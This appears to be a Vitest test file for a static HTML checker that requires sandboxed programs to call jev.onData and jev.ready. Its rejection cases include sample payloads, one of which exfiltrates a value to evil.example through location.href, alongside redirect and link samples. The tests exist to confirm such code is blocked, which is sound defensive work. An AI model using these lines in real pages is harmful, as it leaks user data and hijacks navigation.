import { expect, test } from "vitest";
import { checkHtml } from "./server";

const ok = `<canvas id=c></canvas><script>jev.onData(({bundle})=>{draw(bundle);jev.ready()});function draw(){}</script>`;

test("a jev.* program passes the static check", () => expect(checkHtml(ok)).toBeNull());
test("must call jev.onData", () => expect(checkHtml(ok.replace("jev.onData", "x.onData"))).toMatch(/jev\.onData/));
test("must call jev.ready", () => expect(checkHtml(ok.replace("jev.ready", "x.ready"))).toMatch(/jev\.ready/));

test.each([
  ["location.href = 'https://evil.example/?d=' + p", "navigation"],
  ["window.location.assign('https://x')", "navigation"],
  ['<a href="https://evil.example">win</a>', "links"],
  ["document.write('<meta http-equiv=refresh content=0;url=https://x>')", "navigation"],
])("rejects %s", (bad, what) => {
  expect(checkHtml(ok.replace("<canvas id=c></canvas>", `<canvas id=c></canvas><script>${bad}</script>`))).toMatch(what);
});

test("plain game code with words like 'locate' still passes", () => {
  expect(checkHtml(ok.replace("function draw(){}", "function draw(){const locateBlock=1;const href0=2}"))).toBeNull();
});
